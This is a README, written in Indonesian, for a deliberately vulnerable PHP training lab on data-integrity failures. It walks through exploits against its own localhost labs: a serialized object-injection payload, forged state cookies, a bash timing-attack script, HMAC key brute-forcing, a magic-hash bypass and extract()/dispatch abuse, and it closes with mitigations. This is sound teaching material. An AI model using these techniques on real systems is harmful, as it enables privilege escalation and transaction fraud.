# Data Integrity Lab (Software or Data Integrity Failures)

Aplikasi PHP sederhana yang mendemonstrasikan aplikasi yang mempercayai data, state, atau
artifact tanpa memverifikasi keasliannya terlebih dahulu — bagian dari
**A08: Software or Data Integrity Failures**.

| Lab | Kategori | File |
|---|---|---|
| 1 | PHP Object Injection lewat cookie (`unserialize()` tanpa validasi) | `lab1_php_object_injection.php` |
| 2 | State cookie (saldo/keranjang) tanpa proteksi integritas sama sekali | `lab2_unsigned_state_cookie.php` |
| 3 | Verifikasi signature HMAC pakai `==`, bukan `hash_equals()` | `lab3_timing_unsafe_hmac.php` |
| 4 | Update sistem diterima tanpa verifikasi checksum/signature | `lab4_update_no_checksum.php` |
| 5 | Magic hash / type juggling bypass | `lab5_magic_hash_bypass.php` |
| 6 | Signing secret bocor di client-side JS | `lab6_leaked_signing_secret.php` |
| 7 | Signature cuma menutupi sebagian data | `lab7_partial_signature_gap.php` |
| 8 | Checksum dari sumber yang sama dengan artifact | `lab8_checksum_same_source.php` |
| 9 | Variable injection lewat `extract()` | `lab9_extract_variable_injection.php` |
| 10 | Dynamic dispatch dari input tak tepercaya | `lab10_untrusted_dynamic_dispatch.php` |

## Menjalankan

```bash
cd ..
docker compose up -d --build
```

Buka `http://localhost:8079/dataintegrity/`, atau lewat Portal → **A08: Software or Data
Integrity Failures** → **Data Integrity Lab**.

## Panduan tiap lab

### Lab 1 — PHP Object Injection lewat cookie
Cookie `remember_token` berisi hasil `serialize()` dari objek `RememberMeToken`, dan server
mendeserialisasinya kembali dengan `unserialize($_COOKIE['remember_token'])` — tanpa opsi
`allowed_classes`, tanpa validasi apa pun — lalu langsung mempercayai `$obj->role`.

1. Buka lab, klik **"Generate Payload Admin"** untuk mendapatkan string hasil
   `serialize()` dengan `role=admin`.
2. Karena string-nya mengandung karakter `;` (pemisah field cookie di header HTTP), nilainya
   harus di-URL-encode dulu sebelum dipasang sebagai cookie mentah — persis seperti yang
   dilakukan browser secara otomatis lewat `document.cookie`. Cara termudah lewat konsol
   DevTools:
   ```js
   document.cookie = "remember_token=" + encodeURIComponent('O:15:"RememberMeToken":2:{s:8:"username";s:5:"guest";s:4:"role";s:5:"admin";}') + "; path=/";
   ```
3. Reload halaman — bagian **Admin Panel** langsung terbuka.

### Lab 2 — State cookie tanpa proteksi integritas
Seluruh state (`cart_total`, `wallet_balance`, `role`) disimpan di cookie `cart_state` sebagai
`base64_encode(json_encode(...))`. Server hanya decode dan percaya begitu saja, tidak ada
signature/HMAC apa pun.

1. Decode cookie `cart_state` dari base64 (console: `atob(...)`) untuk melihat JSON aslinya.
2. Ubah field `wallet_balance` (atau `role`) sesuka hati, encode ulang ke base64
   (`btoa(JSON.stringify(obj))`), pasang kembali sebagai cookie:
   ```js
   document.cookie = "cart_state=" + btoa(JSON.stringify({cart_total:150000, wallet_balance:999999999, role:"admin"})) + "; path=/";
   ```
3. Reload — saldo dan role palsu langsung ditampilkan dan dipakai untuk "Checkout".

### Lab 3 — Signature diverifikasi pakai `==`, bukan `hash_equals()`
Cookie `voucher` berformat `data|signature`, di mana
`signature = hash_hmac('sha256', $data, SECRET_KEY)`. Masalahnya, verifikasi di server
membandingkan signature dengan operator `==` (bukan `hash_equals()`), yang **tidak konstan
waktu** — perbandingan berhenti secepatnya begitu ada byte yang tidak cocok, sehingga tebakan
yang cocok di lebih banyak byte awal butuh waktu (sedikit) lebih lama untuk ditolak.

Ada dua jalur eksploitasi:

**Jalur A — Timing attack (konsep utama lab ini).** Endpoint
`lab3_timing_unsafe_hmac.php?data=...&sig_guess=...` membalas `MATCH`/`NO_MATCH` dalam teks
polos, dan (untuk keperluan pelatihan) kode lab ini sengaja menambahkan jeda kecil
(`usleep(50)`) untuk setiap byte awal signature yang cocok, supaya selisih waktunya cukup besar
untuk terukur lewat HTTP biasa (celah `==` yang asli biasanya terlalu kecil untuk diukur lewat
jaringan). Contoh script bash yang menebak signature (hex, 64 karakter) byte demi byte dengan
mengukur waktu respons:

```bash
#!/usr/bin/env bash
# Timing attack sederhana terhadap lab3_timing_unsafe_hmac.php
URL="http://localhost:8079/dataintegrity/lab3_timing_unsafe_hmac.php"
DATA="user=guest;discount=10"
HEX="0123456789abcdef"
GUESS=""

for pos in $(seq 0 63); do
  BEST_CHAR=""
  BEST_TIME="0"
  for c in $(echo $HEX | fold -w1); do
    CANDIDATE="${GUESS}${c}"
    # padding sisa dengan '0' supaya panjang totalnya tetap 64 karakter
    PADDED="${CANDIDATE}$(printf '0%.0s' $(seq 1 $((64 - ${#CANDIDATE}))))"
    T0=$(date +%s%N)
    curl -s -G "$URL" --data-urlencode "data=$DATA" --data-urlencode "sig_guess=$PADDED" > /dev/null
    T1=$(date +%s%N)
    ELAPSED=$((T1 - T0))
    if [ "$ELAPSED" -gt "$BEST_TIME" ]; then
      BEST_TIME=$ELAPSED
      BEST_CHAR=$c
    fi
  done
  GUESS="${GUESS}${BEST_CHAR}"
  echo "posisi $pos -> tebakan sejauh ini: $GUESS"
done
```
Karakter yang butuh waktu paling lama untuk direspons di tiap posisi kemungkinan besar adalah
karakter yang benar (karena loop perbandingan sempat berjalan satu iterasi lebih jauh sebelum
gagal). Script ini bisa saja tidak 100% presisi di lingkungan yang bising (noisy) — ulangi
beberapa kali dan ambil rata-rata kalau perlu.

**Jalur B — Brute force `SECRET_KEY` (fallback yang lebih sederhana).** `SECRET_KEY` di server
sengaja dibuat pendek (`key123`) — bisa dibongkar dengan brute force offline kalau kamu punya
satu pasang `data`+`signature` yang valid (misalnya dari cookie voucher kamu sendiri):
```bash
php -r '
$data = "user=guest;discount=10";
$target_sig = "bfa7595e77872ced957d0d43a4f7001a3f4a452a362a58b3206a438114e86d6b";
$wordlist = ["123456", "password", "letmein", "admin123", "key123", "secret"];
foreach ($wordlist as $candidate) {
    if (hash_hmac("sha256", $data, $candidate) === $target_sig) {
        echo "KEY DITEMUKAN: $candidate\n";
    }
}
'
```
Setelah `SECRET_KEY` ditemukan, forge voucher apa pun (misalnya `discount=100`) dengan
signature yang sah:
```bash
php -r 'echo hash_hmac("sha256", "user=guest;discount=100", "key123");'
```
lalu submit lewat form **Verify Voucher** di halaman lab.

### Lab 4 — Update sistem diterima tanpa verifikasi checksum
Halaman **Apply System Update** menerima file apa pun lewat form upload dan langsung
menyimpannya sebagai update yang "diterapkan" — tanpa membandingkannya ke checksum resmi yang
sebenarnya sudah tersedia di server (`data/official_update_checksum.txt`).

1. Buat file teks apa pun (bebas isinya), upload lewat form.
2. Perhatikan pesan "Update berhasil diterapkan!" muncul — dan hash SHA-256 file yang baru
   diterapkan TIDAK cocok dengan checksum resmi yang ditampilkan di halaman yang sama, tapi
   server tetap menerimanya begitu saja.

### Lab 5 — Magic hash / type juggling bypass
Submit kode recovery `QNKCDZO` lewat form. `md5('QNKCDZO')` = `0e830400451993494058024219903391`
— berbeda dari hash tersimpan (`0e462097431906509019562988736854`, hasil `md5('240610708')`),
tapi keduanya berbentuk "0e" + digit sehingga `==` menafsirkan keduanya sebagai `0`. Verifikasi
"berhasil" tanpa attacker pernah tahu kode aslinya.

### Lab 6 — Signing secret bocor di client-side JS
Buka `reset_preview.js` langsung dari lab — baca nilai `RESET_LINK_SECRET`. Hitung token untuk
email siapa pun (mis. `admin@corp.test`):
```bash
php -r "echo hash_hmac('sha256', 'admin@corp.test', 'corp-reset-2024-preview-key');"
```
Tempel hasilnya ke form "Verifikasi Token" — token dinyatakan valid tanpa pernah menerima email
reset yang sesungguhnya.

### Lab 7 — Signature cuma menutupi sebagian data
Form sudah pre-filled dengan instruksi transfer + signature yang valid. Ubah field `recipient`
(dan/atau `currency`) TANPA mengubah `amount`/`signature`, lalu submit — signature tetap
dinyatakan valid karena cuma menandatangani `amount`.

### Lab 8 — Checksum dari sumber yang sama dengan artifact
Isi textarea dengan konten bebas, hitung SHA-256-nya sendiri (`sha256sum`), tempel ke field
checksum, submit — verifikasi "berhasil" karena checksum yang dibandingkan datang dari pengirim
yang sama dengan artifact-nya, bukan dari kanal terpisah yang tepercaya.

### Lab 9 — Variable injection lewat extract()
Akses `?is_admin=1&account_balance=999999999&username=SUPERUSER` — ketiga variabel yang
seharusnya cuma bisa diisi dari server (diinisialisasi aman di awal skrip) langsung tertimpa oleh
parameter URL lewat `extract($_GET)`.

### Lab 10 — Dynamic dispatch dari input tak tepercaya
Menu resmi cuma `view_profile`/`view_orders`. Akses `?action=grant_admin_role` — fungsi internal
yang tidak pernah ditautkan di menu manapun tetap terpanggil karena dispatcher cuma mengecek
`function_exists()`, bukan allowlist action yang sah.

## Mitigasi (untuk didiskusikan setelah lab)
- Jangan pernah memanggil `unserialize()` pada input yang bisa dikendalikan pengguna — pakai
  format data seperti JSON (`json_decode()`) yang tidak bisa membentuk objek/memicu magic
  method, atau kalau `unserialize()` terpaksa dipakai, batasi dengan
  `unserialize($data, ['allowed_classes' => false])`.
- Setiap state yang disimpan di sisi klien (cookie, hidden field, dsb.) tapi tetap dipercaya
  server harus ditandatangani (`hash_hmac()`), dan tanda tangannya harus diverifikasi ulang di
  **setiap** request menggunakan `hash_equals()` — jangan pernah `==` atau `!=` untuk
  membandingkan nilai rahasia/signature, karena keduanya tidak konstan waktu.
- Kunci untuk menandatangani (signing key) harus dibangkitkan dengan entropi yang cukup dan
  panjang yang memadai (misalnya `random_bytes(32)`), bukan string pendek yang bisa ditebak
  lewat brute force atau wordlist.
- Artifact apa pun yang "diterapkan" ke sistem (update, plugin, file konfigurasi yang
  memengaruhi keamanan) harus diverifikasi lewat **signature kriptografis** yang dicek terhadap
  public key milik penerbit tepercaya — checksum biasa (SHA-256, dsb.) saja tidak cukup, karena
  attacker yang mengganti isi file bisa dengan mudah menghitung ulang checksum-nya sendiri juga.
- **Selalu pakai `===`/`hash_equals()` untuk membandingkan hash/token/secret**, jangan pernah
  `==` — string berbentuk "0e" + digit ditafsirkan PHP sebagai notasi ilmiah pada perbandingan
  longgar, membuat dua hash yang isinya sama sekali berbeda bisa dianggap "sama".
- **Secret signing tidak boleh pernah dikirim ke client dalam bentuk apa pun** — termasuk lewat
  file JavaScript publik untuk fitur "preview"/UX. Kalau logika signing perlu berjalan di client,
  itu artinya secret-nya tidak lagi rahasia dan harus didesain ulang (mis. server yang
  menandatangani, bukan client).
- **Signature/checksum harus mencakup SELURUH data yang integritasnya ingin dijamin**, bukan
  cuma sebagian field — pastikan proses canonicalization mengikutsertakan setiap field yang bisa
  mengubah makna/dampak transaksi sebelum ditandatangani.
- **Checksum/hash pembanding harus datang dari kanal yang independen dan tepercaya**, terpisah
  dari artifact yang sedang diverifikasi — bukan dikirim bersamaan oleh pihak yang sama dalam
  request yang sama.
- **Jangan pernah `extract()` data dari request pengguna** ke scope yang berisi variabel
  sensitif — kalau butuh kenyamanan semacam itu, pakai allowlist eksplisit nama key yang boleh
  diproses, atau akses `$_GET`/`$_POST` langsung per field.
- **Dispatcher berbasis nama (function/class dari input) wajib memakai allowlist eksplisit**
  (`in_array($action, $ALLOWED, true)`), jangan pernah `function_exists()`/`class_exists()` saja
  — keberadaan sebuah fungsi di kodebase tidak sama dengan izin untuk memanggilnya dari luar.
